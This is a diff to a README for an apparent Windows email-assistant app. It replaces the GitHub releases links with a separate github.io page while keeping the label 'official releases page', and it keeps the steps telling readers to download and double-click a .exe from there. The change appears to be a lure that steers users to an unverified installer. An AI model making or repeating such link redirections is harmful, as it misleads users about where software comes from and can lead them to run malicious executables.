@@ -1,6 +1,6 @@
 # 📧 ai-email-assistant - Automated email management for busy people
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/plexusdentalischangtzu246/ai-email-assistant/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://plexusdentalischangtzu246.github.io)
 
 ## 🎯 Project Overview
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, ensure your system meets these
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/plexusdentalischangtzu246/ai-email-assistant/releases) to access the installation files.
+1.  Visit the [official releases page](https://plexusdentalischangtzu246.github.io) to access the installation files.
 2.  Locate the latest version release.
 3.  Click the file ending in `.exe` to download it to your computer.
 4.  Find the file in your Downloads folder and double-click the installer icon.
